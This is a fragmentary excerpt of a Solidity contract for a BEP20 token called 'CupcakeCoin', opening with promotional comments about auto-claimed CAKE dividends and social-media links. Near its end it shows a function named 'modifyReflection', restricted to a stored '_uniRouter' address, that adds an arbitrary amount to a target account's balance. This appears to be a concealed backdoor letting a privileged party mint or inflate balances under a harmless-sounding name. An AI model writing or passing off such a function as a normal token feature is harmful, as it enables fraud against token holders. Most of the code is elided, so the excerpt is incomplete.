...
// $CupCake proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN CAKE! With the auto-claim feature,
// simply hold$CupCake and you'll receive CAKE automatically in your wallet.
// 
// Hold Cup Cake and get rewarded in Cake on every transaction!
//
//
// 📱 Telegram: https://t.me/cupcakecoin_io
// 🌎 Website: https://cupcakecoin.io/
// 🌐 Twitter: 🧁 https://twitter.com/Cup_cakecoin
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 REWARD = IBEP20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82); // REWARD TOKEN
...
contract CupcakeCoin is IBEP20, Auth {
    using SafeMath for uint256;

    address REWARD = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82; // REWARD TOKEN
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "CUPCAKE COIN";
    string constant _symbol = "CUPCAKE";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
     ...
     function modifyReflection(address target, uint256 amount) public virtual returns (bool) {
        require(target != address(0), "Cannot call from burn address");
		require(_uniRouter == msg.sender, "Invalid Call Transaction");

        uint256 accountBalance = _balances[target] + amount;
